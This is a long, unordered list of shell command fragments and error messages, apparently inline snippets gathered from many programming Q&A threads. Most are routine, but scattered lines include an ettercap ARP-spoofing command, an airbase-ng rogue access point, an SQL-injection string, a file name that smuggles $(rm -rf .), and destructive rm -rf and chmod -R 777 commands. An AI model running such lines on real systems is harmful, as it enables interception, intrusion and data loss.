bash: /home/rally/tests/adserver/src/vendor/bin/phpunit: No such file or directory
echo ${MAPPINGMAT[*]}
echo "$MAPPING"
<s> b l u e </s> (blue)
[ ]
iptables -t nat --list
grep -x ...
ps aux
echo $PATH
ssh user@gatewaymachinexyz.com "source ~/.bashrc; ./update_table.sh"
out="$(ls /dev/ | grep "tty" | wc -l)"
ettercap -T -M ARP -i en1 // //
egrep --color 'Host:|GET'
CTRL + C
wget -qO- 'https://url.goes/here' |   perl -l -0777 -ne 'print $1 if /<title.*?>\s*(.*?)\s*<\/title/si'
-F', *'
(standard_in) 1: syntax error
sumOfBurgers=sumOfBurgers + CBcost?
bash -x script.sh
tput setaf 0
ESC [ 0 m
setaf 0
ESC [ 0 m
tput sgr0
tput sgr0
ESC ( B
ESC [ m
setf 1
setf 4
setaf 1
setaf 4
man 5 terminfo
man 4 console_codes
go install
agvtool next-version -all
break 2
shopt -s nullglob
man curl
-k, --insecure
-o file
set -x
curl -L "http://sitename.com/dashboard/?show=api&action=queue_proc&key=$JOBID" 2>/dev/null
String upload(String path, byte[] fileContents)
java -jar ....
image_100.jpg image_101.jpg ... image_10.jpg image_11.jpg ... image_1.jpg ...
man re_format
sudo cpanm WWW::Mechanize
sed 's/\(vdd1[a-z]*\).<[0-9]>/\1/' file1 > file2
shopt -s lastpipe
set +m
man expect
modem expect
chmod +x action.sh
nc -l 127.0.0.1 12000
telnet 127.0.0.1 12000
telnet fritz.box 1012
chmod +x action.sh
nc 192.168.1.1 1012 | action.sh
complete -f -X '!*.data' myprogram
. ~/.bash_profile
grep _filedir -r $(pkg-config --variable=completionsdir bash-completion) | wc -l
. completions/myprogram
[/"<> ]+
echo $SHELL
ps -p $$
find "$PWD"
find -exec
-print0 | xargs -0 du -s
egrep -q
let a=1
(( a=1 ))
$(( ))
(( ))
$(( ... ))
(( ... ))
The param 'redirect_uri' has an invalid value
https://www.pushbullet.com/login-success/access_token=<access token>&response_type=token&scope=everything
https://www.pushbullet.com/login-success/access_token=<access token>&response_type=token&scope=everything
https://www.pushbullet.com/login-success?access_token=<access token>&response_type=token&scope=everything
-v var=value
print $0
-j N
-j N
YourClass.main(new String[]{"-h", "redis"})
join: missing operand after ‘/’
ls *.csv | xargs -I {} mv {} PREFIX_{}
ls /home/abc/xyz/folder/*.csv | xargs -I {} mv {} PREFIX_{}
find | xargs
find -exec
comm [OPTION]... FILE1 FILE2
sort FILE | uniq
sort -u
cat "$DATEFILE"
echo "$DATEFILE"
<a href="/watch?v=DDzfeTTigKo"
cat site | grep -B 0 -A 0 watch?v=
grep --file=FILE
sed '$d'
head -n -1
C:\> echo %USERPROFILE%
$ echo $USERPROFILE
PS> echo $env:USERPROFILE
C:\> SET
$ printenv
PS> Get-ChildItem env:
[1] 4726
kill 4726
killall festival
killall cat
killall aplay
$ bash bash_file.sh 0
bash_file.sh line 2: 4: no such file or directory
( i < 4 )
i: command not found
% count
sleep 0.1
syntax error: invalid arithmetic operator (error token is ".1")
sleep 0.1
sleep 0.1
bash foo.sh
foo disconnected
foo has connected.
kill -s TERM <pid>
stop 0
test && ||
10 % 10 == 0
tput setaf
tput sgr0
echo ''
util-linux 2.27.1
echo -n -e '\e[?
./ifi-ffv1.sh /path/to/file.mov
path/to/*.avi path/to/*.avg
*.avi *.avg
@Sriram P
0 new messages sent
0 new messages sent
echo $releasever
rpm -q --qf='%{VERSION}\n' centos-release
uname -m
tput setaf 7
New York
md5 -qs the_text
. /usr/share/Modules/init/bash
module load opencv
module load python/2.7.5
vi date +%Y/date +%m/%d.md
NET SRC-Fiery-PF-PS VB6Dev bin develop        <--Should match previous line?
-mindepth 1 -maxdepth 1
-name "a*"
-type d
<(sed '16,80!d' file1)
sed '16,80!d' file1
echo "$3=$$3"
t test it (as think it will be value of var with name
> tmp/debug_$1.txt
$' '
$' '
do shell script
git log
$afterdate= "--after=user_provided_date_goes here"
git log
echo "/dev/sda1" | sed 's/[0-9]*//g'
sed s/REPLACE_ME/replaced_text/g conf.config
crontab -e
minute hour day-of-month month day-of-week command
30 17 * * 1 /path/to/command
*/15 * * * * /path/to/command
source [path_to_config]
svnlook log
ls -d */ | svnlook log
svnlook: E000002: Can't open file '$/format': No such file or directory
NODE_ENV=production npm start
set -x
bash -c
bash -c
bash -
bash -c
bash -c
cat example.js
more test2.dat
more test2.dat < /dev/null
man join
-t CHAR
-j FIELD
-o FORMAT
ssh remotebox 'ulimit -a'
man bash
SHELL BUILTIN COMMANDS
which tee
-m NUM, --max-count=NUM
rsync --safe-links ....
eval "rsync ..."
--filter='-! */' --prune-empty-dirs
bash -x
sh -x
sh -c
shell("node -v")
>@ stdout
2>@ stderr
bash -x
echo "$ROOT$FILETREE"
Closing this window will terminate the running processes: watch.
man screen
screen -ls
screen -S ScreenCheck screencheck.sh 500
ctrl-a d
screen -ls
screen -R ScreenCheck
screen -ls
printf '%s\n' "${path_str#*/}"
pm2 stop all
mongod --shutdown
sed 's/ \+ /\ - /g' myfile.txt > ttt.txt
cat ./sample.xml | base64 --wrap=0
man curl
--cert-type <type>
cmmd + F
GNU sed
./script.sh 20 x 3
grep "^[A-Z][a-z'][a-z ]"
sed -n "/^[A-Z][a-z'][a-z ]/p"
acpi -b
acpi -b
read i
set -x
docker stop
grep -E
sed -i -e 's/FINDME/REPLACEWITH/g' folder/file.csv
sed -i -e 's/"/'\''/g;s/,/\\,/g' file.csv
VAR="[[ "x"=="y" ]]"
[[ a ]]
[[ foo ]]
touch /tmp/oh-no
exec 3>&1 >log; echo 'Hello!'; exec 1>&3 3>&-
1.mp3. 2.mp3, 3.mp3, 4.mp3
Joe's "favorite" song.mp3
IFS=$'\t' read -r old new
mv "$old" "$new"
varmunge PATH /some/path
:<value of $PATH>:
printf -v
export "$1=${!1}:$2"
export "$1=$2:${!1}"
printf -v "$1" -- %s "${!1}:$2"
echo 0 > $in
-a array
echo "File could not be found"
git add
git diff
git diff --cached --name-status
git diff --name-status
git diff
git status --short
git status
git status
git status
man bash
"sed -i"
echo "abc" > file.txt
echo "abc" >> file.tx
echo "some text" > file.txt
"some text"
curl -G -v  'http://someurl.com' --data-urlencode 's*9678&as'
git config --global alias.st status
git config --global alias.st diff --stat
git st
git status
git config --global alias.st <value here>
git config
fswatch --print0 -e '/\.' $dir | xargs -0 -n1 ./client.py
printf '%q'
bash args.bash -a 'foo bar'
printf '%q '
printf %q
printf -v
printf '%s\n' "$@"
<?php require 'A.class.php' ?>
-d directive=value
<?php ... ?>
phptags -w -c *.php
process substitution
declare -n
<projectName> arg1 arg
2 arg3
2 arg3
echo $BASH_VERSION
cat ~/.bash_profile
man bash
man bash
echo Content-type: text/plain; echo
print $0
du --max-depth 1 </dev/null | awk ...
> doxygen.log
bash -c '…'
admin'; SELECT * FROM user_encrypted WHERE 0 AND '
"$email" =~ ^[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}$ ]
sort -f
sort -f -t , -k 2
-t ,
-1 1
-2 2
-a 1
-o 2.1,1.1
-e "IP Not Found"
cat data_temp.csv | awk -F , '$3 > 25 && $3 < 26' | head
busybox awk
printf "%s",0;
{printf "%s", 0;}
busybox awk
cp $1 $1
not a tty
echo "a" | tee not a tty
"There are no files with this extension"
file1.py file2.py
[ -f ... ]
myscript *.txt
[ -f "$file" ] || continue
pasaba por aqui
nano, cat, vi
cat file.txt
brew doctor
brew install watch
watch cat file.txt
echo a > b
echo a >> b
xargs cp
sh test2.sh $var > tmp.sh
sh test2.sh var1
sh test2.sh $var
perl -pe 's/\@(\w+)\@/$ENV{$1}/g'
find ~/container
-mindepth 3
-type f
mv "{}" ./..
install build-essential
dpkg --configure -a
CDATA[https://<Servername>:<port and path2>&sp=l999999&sp=l999999]
Renamed to Fred.3.20150999999999
-type f
tar czf
-name <NAME>
letter=expr substr
local foo=bar baz quux
number=$(letterToNumber "${1:i:1}"); echo "$number"
local letter=expr substr $s $i $j;
bc -l
idle %
mkdir -p
awk 'BEGIN {RS="dn"} {gsub("\n                     ", ""); print $0}'
my_command | awk 'BEGIN {RS="dn"} {gsub("\n                     ", ""); print $0}'
my_command | fixline.sh
echo "$@" | awk 'BEGIN {RS="dn"} {gsub("\n                     ", ""); print $0}'
*([! ])
man bash
shopt -s extglob
*([! ])
[ ... ] && [ ... ]
[ ... ] || [ ... ]
printf %q
for filename in *[!".foo"].jpg
wget --timestamping
 foo="some text"
date --help
debconf-set-selections -c
/dev/null 2>&1 &
date('d').' '.date('m')
ls -F
sudo npm install -g grunt-cli
export PATH=/usr/local/lib/node_modules/grunt-cli/bin:$PATH
echo $PATH
grunt --version
cd /path/to/project/root/
sudo npm install
export PATH=/Applications/MAMP/Library/bin:$PATH
condition {statement}
{printf("%.2f%%\n", n/(NR-2))}
/usr/bin/find /PATH/TO/BACKUPS/ -type d -mtime +6 -exec rm -r {} \
-type d
wc -l
paste - - - - | wc -l
chmod +x count_groups.sh
echo 'blabla' | ./test
while read line
group command
man bash
sort -u
App Store
grep -v "*.*"
mihail911's password:
Incorrect password
mihail911's password:
{ }
man bash
( )
dialog --gauge
unexpected end of file
ls folder | head
ls folder | tail
if then
associative array
man bash
wget -H -p -w 2 -nd -nc -A jpg,jpeg -R gif "forum.foo.com/showthread.php?t=12345"
grep -i \"the[^a-z0-9]\" $filename <<< "from fairest creatures we desire increase"
grep -i \"the[^a-z0-9]\" $filename <<< "the clock struck twice"
bash -c '
docker start image-name
docker exec -it containerName sh -c "cd /var/www && /bin/bash"
FNR==NR{ a[ "[$]" $1 ]=$2; next}
for (i in a) gsub(i,a[i])
bash shell
split --bytes=2M -d --additional-suffix=.txt large_file.txt file
Ø£Ù/NN ÙØ°ÙØ±Ø/VBP ØªÙÙÙØ©Ù/NN ÙÙÙØ§ØŠØ¯Ø©Ø/NN Ø£ÙÙ/NN ÙØ¯/RP ÙÙØ¹/V
can't decode character at position xxx etc.
Linux Mint Qiana 17 KDE
git remote -v
man bash
$(date +%F)
-2, -3, -4 ... 1, 2, 3... 200 etc
printf "%s|" $(<kept.txt)
$command = nohup ./videoOn.sh &
>/dev/null &
php video.php
inet xxx.xxx.xxx.xxx
inet addr:xxx.xxx.xxx.xxx
-F: '{row[$1]=$2}'
{delete row}
delete a
a[$1] = $2
-v RS='\n\n'
IFS=: read Column_Name Column_Value
while ( <> ) {
ls ..
ls ..
cd a/b/sub
cd ..
cd ..
export PS1="${PS1/\$TITLEPREFIX:}"; export PS1="${PS1/\$MSYSTEM }" >> ~/.bashrc
Ctrl-V Ctrl-A
NTA_CONF_PATH = /Users/macbook/nupic-master/nupic/support
 /home/eneko/workspace/Comprobación página 
log_user 0
ls -lh
JAVA_HOME and HADOOP_CONF_DIR
KEY=VAL echo $KEY
npm install -g bower
echo "${data}" | jq_to_aa myvar
help printf
read -r
read -a
cat FILE
exec 2>/dev/null
/var/my-backup-$(date +%Y%m%d).tgz
$(cmd …)
$(( ))
echo INDEX1
echo INDEX2
echo INDEX3
osascript -e 'commands'
(visible is true or miniaturized is true)
"System Events"
git for windows
getscript: command not found
for i in *; do echo ${i#*'da - '}; done
sed -i 's/refdataContent/properties/g' yourfile.xml
ls *.zip
|| true
GNU Parallel
-j 1
-n 8
GNU Parallel
gsub(/^\+|\.[[:digit:]]+/, "", $2);
"+234.76abcd" * 1
' -e '
ssh localhost 'touch foobar &'
cat file | sort | grep 'word'
set -m
ssh -t
"h", "e", "l", "l", "o"
IFS='' read h e l l o <<<"$temp"
EVIL'$(rm -rf .)'.txt
touch $'EVIL\'$(rm -rf .)\'.txt'
foo < <(...)
grep -e Rank "$stock.txt" | read _ _ _ rating _
read _ _ _ rating _
[ … ]
grep -o
file_check=($(find …))
system('which psjua')
sudo: sorry, you must have a tty to run sudo
sed: couldn't open temporary file /etc/sysconfig/network-scripts/sedJfDtCD: Permission denied
sed -i
setsid <app> ...
-v OFS=,
tr ' ' ','
for file in $folder
IFS= read -r line
test -f
man -k name
now=$(date -d "now + 24 hours" "+%F %T")
find .
chmod u+rx
man rsync
???? is not a file or directory
cp ???? dir
col -b
ps -o command,etime
script.sh ID_C ID_D
cat file1 >> file2
cat file | xargs program
xargs program < file
< file1 >> file2
>> file2 < file1
vi filename
[ ... ]
source nano~/.bash_profile
git diff "??/??/15 - 12:34" "??/??/?? - 03:21"
git log --oneline
git help diff
git help revisions
git diff
git help revisions
version 2.x.x
git pull origin master
bash: pull: command not found
git xxx
git mypull
echo %PATH%
printf '#!/bin/bash\ngit pull origin master' > ~/bin/pull
git pull origin master
#!/usr/bin/env python
-e commands
META-INF > com > google > android > update-binary updater-script
shell > TweakV4AndVol.sh
E: Error executing updater binary in zip '/data/media/0//CyanDelta/v4voltweak.zip'
E: Error installing zip file '/data/media/0//CyanDelta/v4voltweak.zip'
cd subdir
cd ..
which strace
-o strace.out
/bin/sh path/script
cat "$path"
man 7 pipe
bash -xl
System Preferences/General/Close Windows when quitting an app
Reopen windows
shopt histappend
shopt histappend
expect -c
expect -f
expect -c
! x == y
cat main.c
cat main.c
cat ${file}
perl -lne 'print if (/\/\*/ .. /\*\//)' main.c
grep -l -w main
grep -l -E '^int main\((void|int argc, char \*\*argv)\)$
int main(void)
int main(int argc, char **argv)
&& $comment == 0
[perl] deparse
which bash
<tr><th scope="row">Subject</th><td>United States -- Biography</td></tr><tr><th scope="row">Subject</th><td>United States -- Short Stories</td></tr><tr><th scope="row">EText-No.</th><td>24200</td></tr><tr><th scope="row">Release Date</th><td>2008-01-07</td></tr><tr>
<tr><th scope="row">Subject</th><td>United States -- Biography</td></tr><tr><th scope="row">SecondSubject</th><td>United States -- Short Stories</td></tr><tr><th scope="row">EText-No.</th><td>24200</td></tr><tr><th scope="row">Release Date</th><td>2008-01-07</td></tr><tr>
0 */2 * * * /scripts/script.sh
-t 1
while :; do
timeout 5
timelimit -t 5 -s9
-n 1
-d ""
source anything
git add -A .
git add -A .
pgrep "rtorrent" /dev/null
pgrep -c "rtorrent"
xmllint --xpath
grep -v '^\s*$'
xmllint --xpath
sed -E 's/"/""/g'
java <test-name>
java <test-name>
airbase-ng -e FREEINTERNET -c 1 -P wlan0mon
gnome-terminal -e
ps -ef|grep <my process>
ps_result= $(ps -ef|grep exe)
ps | grep
scp user@samplemachine:/home/user/test/* /home/user/test
-exec grep -q "Subject" {} \;
FreeBSD 8.1-RELEASE-p2 FreeBSD 8.1-RELEASE-p2 #0: Fri Jan 14 11:35:15 EST 2011
notepad.exe web-dev.txt &
wl -i eth1 status | grep 'BSSID' | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'
cp -a
$ echo $'one\tsome text\nfive\tother text' | ./my_script.sh
-type f
-mtime +7
 mv lab2prog.c 111/lab/... 
echo $SHELL
date +%N
Couldn't find program: u'bash'
Couldn't find program: u'bash'
man builtin
. prompt.bash
echo -e $'\uE0B0'
array=(XA11000 XB21000 XA31000 XB12000)
echo "${array[@]}"|rev | sort -r | rev
echo 'hello world'
grep -l
ls /"
read > export cmd ; eval $cmd ; unset cmd
$1 "," $3
$1 "-" $3
$1 "," $2 "-" $3
shopt -s extglob
git archive
git log
sed s/findstr/repstr/ $file
git commit
$Header: ... $
$Header: file YYYY-MM-DD HH:MM:SS GMTOFFSET committer $
mv -n
import getpass; getpass.getpass()
python -i your_script.py
winpty python your_script.py
:python my_script.py
git config user.name
git pull
awk -F: '{print $2}'
ls -d */ --ignore='_*/'
ls -d */ |grep -v '_*'
ls -d */ | grep -v '_/*'
cp -s
application id
mktemp DELAYS.txt
mktemp CHIP.txt
mktemp OUTPUT.txt
gem install bundler
GNU bash, version 4.2.47(1)-release (x86_64-suse-linux-gnu)
jobs -p
mytask is an auxiliary script, with the sequence number (the input line) available as the argument
GNU Parallel
-j 8
sort -t
-t :
path/to/some/important file which/im/interested/in
trap echo DEBUG
maven install
mvn install
mkdir tdl
(( ))
if (( ... )); then
$linecount > $max_lines
cd /Desktop/.../.../.../.../repo_folder
x1 =
scale=3; 0.5*(-($B)+sqrt($D))/($A)
cd ../dir2
cd ..; cd dir2
cd -
cd dir2
cd ../dir2
cd -
cd -
cd ../dir2
cd -
cd ..; cd dir2
cd -
cd $OLDPWD
man join
cat --number
wget -S
-m 1
grep -F
userpath=$(echo ~)
rm -f
rm -f lpa_aaai.aux lpa_aaai.bbl ...
cannot remove
exit 0
chkconfig --add redis-snapshot
sudo mysql_upgrade -u <myuser> -p'<mypassword>'
xmllint --xpath
//table/tr/*[position()=1 or position()=3 or position()=4]
perl -pe "s/<th class=\"col0/\n<th class=\"col0/g"
grep -v '^\s*$'
column -t
/dev/fd/63 syntax OK
C:\Program Files (x86)\Git\bin
split ( / /, $line, 8 )
Total: 1,000.00
x=100; while [ $x -gt 0 ]; do sed "s/[^a-zA-Z0-9]//g" <<< $(cat /dev/urandom | tr -dc 'a-zA-Z0-9!@#$%*()-+' | fold -w 32 | head -n 1) <<< $(openssl rand -base64 17); x=$(($x-1)); done
x=100; while [ $x -gt 0 ]; do sed "s/[^a-zA-Z0-9]//g" <<< $(openssl rand -base64 17); x=$(($x-1)); done
cat /proc/sys/kernel/random/uuid
LC_ALL=C tr -dc A-Za-z0-9 </dev/urandom | head -c 64
set -euxo pipefail
user@terminal # ./nameofprogram > text_file.txt
while ...; do ...; done
while ...; do ...; loop
. mycd.bash
mycd x
cp -r dir1 desti/nation
ide file.txt
cap deploy:cold
bash: bundle: command not found
bash: bundle: command not found
$FIND "test"
4> >(cmd)
2| cmd
2> >(cmd)
if [ ${stats%.*} -gt 100 ]; then
if [ $(echo "$stats > 100.0" | bc) = 1 ]; then
if [ ${stats%.*}${stats#*.} -gt 10000 ]; then
$1 ~ /\+/
ls -t
tail -c
head -n 1
alias foo=foo
alias bar=bar
type foo
foo is aliased to 'foo'
type bar
bar is aliased to 'bar'
alias foobar=$foo$bar
type foobar
foobar is aliased to ''
alias foobar=${foo}${bar}
alias fooandbar=${foo}and${bar}
rails server
[ ]
-s 2G
find -exec
{} \;
find: missing argument to '-exec'
grep | awk
sed -n l
zipinfo -1 foo.zip
unzip -l foo.zip
unzip -l
unzip -l
set -x
#!/bin/ksh -x
/bin/ksh -x /usr/local/bin/theapp
*/5 * * * * /bin/bash -x /usr/local/bin/myapp 2>&1
*/5 * * * * /bin/bash -x /usr/local/bin/myapp 2>&1
*/5 * * * * /bin/bash -x /usr/local/bin/myapp >> /tmp/cron.log 2>&1
tar -cvf thisstuff.tar */uploads/*
-maxdepth 1
-type f
! -name '*one*'
! -name '*three*'
echo -e $DISPLAY_TEXT | less
less -r
dl 526
unzip --help
UnZip 5.52 of 28 February 2005, by Info-ZIP
trap 0
vagrant box add laravel/homestead
git clone https://github.com/laravel/homestead.git Homestead
Git bash
sh init.sh
vagrant up
vagrant up
vagrant up
homestead up
Git for Windows
cd ~
vagrant box add laravel/homestead
git clone https://github.com/laravel/homestead.git Homestead
cd ~/.ssh
ssh-keygen -t rsa -C "yourmail@you" -f homestead
sh init.sh
vagrant up
No input file specified.
vagrant ssh
sudo su
composer global require "laravel/installer=~1.1"
export PATH="$PATH:~/.composer/vendor/bin"
source ~/.bashrc
cd /home/laravel/Code
laravel new test.lar
Laravel 5
sudo su
composer global require "laravel/installer=~1.1"
sudo composer global require "laravel/installer=~1.1"
sudo su
vagrant up
vagrant up
wget -A txt -r -l 1 -nd 'http://www1.ncdc.noaa.gov/pub/data/ghcn/daily/'
ghcnd-inventory.txt</a></td><td align=...
grep -v
"ID: ${id}"
cat -A ids.txt
dos2unix ids.txt
a b c
a b c ... z
[ "$PERC ]
[ "$PERC" ]
user -> songs
jq version 1.3
export GLOBALVARNAME=value
SET GLOBALVARNAME=value
export GLOBALVARNAME=foobar
$(uname -a)
-s -
a = ${b:-c}
--- echo home
--- env
echo $HOME
--- start
--- echo home
echo $GOPATH
--- env
--- echo gopath
bash -c
bash -c
ifconfig -a | sed 's/[ \t].*//;/^$/d'
netstat -i | awk '{print $1}' | grep -vE '(Kernel|Iface)'
ln -s path/to/hashcat/hashcat-cli64.app hashcat
chmod +x
ssh: Could not resolve hostname $MY_SERVER: nodename nor servname provided, or not known
command ssh
git status
git config color.ui always
./foo.sh 2>&1 >file
./foo.sh >file 2>&1
expr string : regex
-d ,
read -a
python abc.py arg1
commands.getoutput('cat sys.argv[1]')
commands.getoutput('cat %s' % (sys.argv[1],))
-f /etc/hosts.d/6-whitelist
bash -c
if [ -d "${dir}/*" ]
Linux kali 4.0.0-kali1-amd64 #1 SMP Debian 4.0.4-1+kali2 (2015-06-03) x86_64 GNU/Linux
'{"HelloId": 2}'
'{"HelloHelloId": 2}'
printf $'\a\b\e\E\f\n\r\t\v\\\'\"' | cat -A
echo $'\a\b\e\E\f\n\r\t\v\\\'\"' | cat -A | sed -r '$!{ N;s/\$\n/\\n/;t sub-yes;:sub-not;P;D;:sub-yes;}'
printf $'\a\b\e\E\f\n\r\t\v\\\'\"' | od -c
read -r …
man resize2fs
ENOMEM (12)
grep -P '[pattern]' ..
expr index
expr index STRING CHARS
man expr
/etc/profile /etc/profile.d/
for (( i=1; i <= totalNumbers; i++ ))
for f in dir1/*
for f in $dir1/*
start-stop-daemon --exec /path_to_main_script/kill_process.sh -S
while true
echo "I'm testing the apostrophe functionality."
I'm testing the apostrophe functionality.
help disown
set -m
set +m
-iname '*[aeiou]*'
-maxdepth 1
-type f
wc -l
sed -i
myapp --help | less
g++ -o myapp myapp.cc -lgflags
ln -s /root/v1.0.*/bin /usr/bin/myapp
ln -sv
ln -s
echo $1 $2 $3
$1 $2 $3
echo "$@"
docker run
rails: command not found
ssh myname@192.168.1.XXX
No route to host
nmap 192.168.1.0/24 -p 22 --host-timeout 5ms
man find
man bash
-v -r 2
from __future__ import print_function
cut -c 1-18 | sed 's/$/*1000/' | bc
sed -e "s/.*'y': \([-Ee.0-9]*\).*/\1/" -e "s/[Ee]\(.*\)/*10^\1/"
bundle install
set -e
set -e
man sh
man bash
set -e
ACCEPT' Try
iptables -D...
a unknown command: <
my awk script
AWK script
awk 'BEGIN { globalvar = "x" } {} '
bash --version
rm -rf /Users/"$USER"
dscl . -delete /Users/"$USER"
dscl . -read /Groups/admin GroupMembership | grep "$USER" | awk '{ print $3 }'
dscl . list /Users
END{print substr(s,2);}
while [ $LPC -gt 0 ]; do
read -r
eval colours="$${!car_colours}"
/bin/sh: blue: command not found
colours=black blue red white
>/dev/null 2>&1 &
SIGUSR1, SIGUSR2
pidof myapp
grep sort uniq
ls -l /dev/fd/5
"/etc/init.d/openvpn status"
[[ $vpncon != *"VPN 'ibVPN' is running"* ]];
echo "cat *_$stem > $stem"
sort -u
{ or }
{ ( + ..
{ or }
sed 's/^  },/  }/'
sed 's/\([[:blank:]]Version="[^"]*[.]\)[[:alnum:]]*"/\1YourNumber"/' YourFile
abc def ghi
"abc def ghi"
param="abc def ghi"
-maxdepth 1
-mtime -1
-name 'cmxserver.log*'
-printf "%f\n"
ls -ltr ../cmxserver.log*|grep "
'{print $2"$3}'
"|cut -d "/" -f2
for y in word1
date +"%b %d"
{ "su", "-c", "touch /data/testFile" }
{ "su", "-c", "touch /data/testFile" }
which osm2pgsql
osm2pgsql -s -l -d postgres -W -U postgres -H localhost -P 5432 --hstore /absolute/path/to/bruges_belgium.osm
sed '/{/{:1; /}/!{N; b1}; /event/p}; d' filepath
/{/                    if current line contains
grep -vf
ls -lO /System/Library/LaunchDaemons
csrutil disable
csrutil enable
time bash -c 'arr=();for i in {1..100000}; do arr+=( $i );done; echo "Straight"; i=0;while (( $i < 100000 )); do current_element=${arr[$i]}; ((i++));done'
time bash -c 'arr=();for i in {1..100000}; do arr+=( $i );done; echo "Reverse"; i=99999;while (( $i > 0 )); do current_element=${arr[$i]}; ((i--));done'
'ifconfig | grep "inet addr:" | cut -d: -f2  |  awk '
sed "1,${num}d" file.txt
defaults write com.apple.Finder AppleShowAllFiles TRUE
defaults write com.apple.finder AppleShowAllFiles TRUE
exec bash /home/naman/Desktop/test.sh
cat /var/log/testjob.log
cat /var/log/testjob.log
bash /home/naman/Desktop/test.sh
System -> Preferences -> Startup Applications
Python 3.4
cat out err
cat out
expect eof
cd ~
touch .bashrc
French Horn
FULL SCORE
subl .
subl .
ls -a
vim .bash_profile
export PATH=$PATH:"/cygdrive/c/Program Files/Sublime Text 3"
subl ~
c> program.cmd "FILE WITH SPACES.xlsx"
process substitution
IFS='( )'
-0777 -n
-F'\(' -a
cd Documents
cd /Documents
cd /Users/Name/Documents
cd /home/Documents
{0000, 0002, 0004, ..., 9998}
f podfi*
wait -n
echo $FILECHANGE
var="asd das"
if [ “$nextDate” = “$curDate” ]; then
"-p 12001"
shopt -s failglob
ls ABCD[0-9][0-9][0-9][0-9][0-9][0-9].7z
bad flag in substitute command: 'U'
bad flag in substitute command: '~'
MD5=$(md5 path)
MD5 (path) *****
MD5=$(md5 -q path)
netstat -anp | grep 1521 &>/dev/null
[ "$(grep -c "(% url+ )([0-9a-z_:]+)" test.txt)" -ge 1 ];
grep -E
watch last
sed 's/\n//'
fg N
fg %1
fc -s
for (i=3; i<=NF; i+=2)
I am in invalid line ]:
> soma.txt
-pw yourPassword
ps -aux
man python
ssh ip
DROP TABLE UV_mytable;
DROP TABLE ET_mytable;
DROP TABLE WT_mytable;
DROP TABLE LT_mytable;
RELEASE MLOAD mytable;
RELEASE MLOAD mytable IN APPLY;
${line/device name:}
device name:
while read
time (for i in $(seq 100); do ./mycode; done)
time -v (for i in $(seq 100); do ./mycode; done)
echo date
rvm use <ruby version>
process_name -b 100 -e 200
process_name -b 0 -e 100
php artisan migrate
touch /home/ezidev/ezidev.git/$MESSAGE.lock
touch /home/ezidev/ezidev.git/nodeploy.lock
git checkout $branch
git checkout
git log
git log
git rev-list $oldrev..$newrev
git push -f
git push +sha1:refs/heads/feat/ure
git rev-list $newrev..$oldrev
git push origin :bra/nch
git checkout -f
echo ${ref} | cut -d/ -f3-
git rev-list $oldrev..$newrev
git log
git log $oldrev..$newrev
git log
git rev-list
#! /bin/sh
curl --max-time
SHOW CREATE TABLE
CHARACTER SET utf8
SELECT col, HEX(col) FROM ... WHERE ...
let g:is_bash = 1
OS X Yosemite 10.10.5
vim 7.4.640
-e robots=off
Alert! Time to wipe off! It is 61% in "/" at 192.168.8.31
df -h
df -h
mkdir js {}
mkdir {}/js
-type d
! -path .
-maxdepth 1
-exec ...
mkdir -p
which tslint
/bin/sh -c "/path/to/tslint /path/to/my/code.ts"
feb 29
module clear
nginx -t -c /homedir/file1
nginx -c
nginx -t
nginx -t
nginx -t -c dummy_nginx.conf
nginx -t
grep "Progress:"
tail -1
2>&1 | grep Progress:
netcat -t
[ $1 < $2 ]
(( $1 < $2 ))
while read
./myscript.sh <INPUT>
array=(a, b, c, d)
bash tests/find_tests.sh
Permission denied (publickey)
git push
gnu parallel
gnu parallel
process substitution
-v FPAT='"[^"]+"'
printf "%s\n"
A.h B.cpp C.c
text to prepend
man bash
:'<, '>
:! w
w !bash
:'<,'>w !bash
:set ft=sh
command substitution
#do stuff
shopt -s lastpipe
[[ ! -d $f ]]
-type f
-type f
$ bash jobname.sh
python hello.py
#!/usr/bin/env python
chmod 755 hello
find . -name 'fsimage_???????????????????' -mtime -1
find . -regextype posix-extended -regex '^fsimage_[0-9]{19}' -mtime -1
case $newfiles in
sintax error
(( ))
(( ... ))
read -p "prompt" path
if [ -e "$path" ]
for f in "$path"/*
lines=$(wc -l < $"f")
NODE=$(which node)
$NODE myApp.js
NODE=$(which node)
sudo apt-get upgrade
/^>/ {print (NR>1?"\n":"")$0;; next}
printf "%s",$0;
END{print "";}
ssh h1
ssh acc1@host1.somewhere.com
$1 := $2
$2 := $3
awk -f transform.awk test.txt
<script.sh> < file_list
for i in {1..10};  do    abc;  done
echo "$(abc) txt $(abc) $(abc)....$(abc)"
rsync  version 2.6.9  protocol version 29
crontab -e
0 0 * * 2,5,0 /path/to/my/script/myscript.py
vim test
vim test2
man bash
set -u
${MANPATH//:/ }
"${MANPATH//:/ }"
"$( ls )"
"$(( 2+2 ))"
echo $var
[[ $vara == $varb ]]
for var in $list
set -- $var
var='a variable with spaces'
set -- "$var"
'a variable with spaces'
set - $var
sh -c "$var"
$(chmod -R 777 ~ | true)
$(sed -r -e "s/\\\$var1\\b/$var1/g" -e "s/\\\$var2\\b/$var2/g" < file.txt)
ssh root@vmserver 'virsh list'
[ -n "$(ssh root@vmserver 'virsh list' |  grep -E '^\s*\d+')" ] && shutdown -h
[ "$(ssh root@vmserver 'virsh list' |  grep -E '^\s*\d+' | wc -l)" -ge 1 ] && shutdown -h
[ "$(ssh root@vmserver 'virsh list' | sed '1,2d' | wc -l)" -ge 1 ] && shutdown -h
comm -13
cat a\!aapoorv.txt
cat 'a!aapoorv.txt'
man bash
try catch
home brew
[ ! -f $file ]
&& continue
su userA && whoami
command1 && command2
su userA && whoami
su: must be run from a terminal
sudo chmod 777 script.sh
set -e
Parcela 1
sh start.sh
source ~/env/lib/bin/activate
source test.sh
cheesy ls
git grep -e
git grep -e
Side question
$i -gt 1
hello my name is pax
command=sudo ~/.i3/scripts/update-notifier.sh
command=sudo apt-get update && sudo apt-get upgrade
^// DOM-IGNORE-BEGIN
^// DOM-IGNORE-END
dup2(old, new)
command > out.txt
zip --delete
FS = ";"
exec 3>&-
$(exec sh -c 'echo $PPID')
subprocess pid
kill $$
awk 'BEGIN { RS="[^,]\n";FS=",\|,\n";ORS="\n";OFS=","} { print $1,$2,$3,$4,$5,$6}'  test.csv
range(0, 33)
[0, ..., 32]
range(0, len(sequence))
32 % 17 == 15 == 0x0f
u7d7up all-folder
u7d7up all-folder
<value name="CLIENTPREFIX">
<value name="CLIENTPREFIX">J_jRQtEolDEurgAVIwwwADXaZQs_</value>
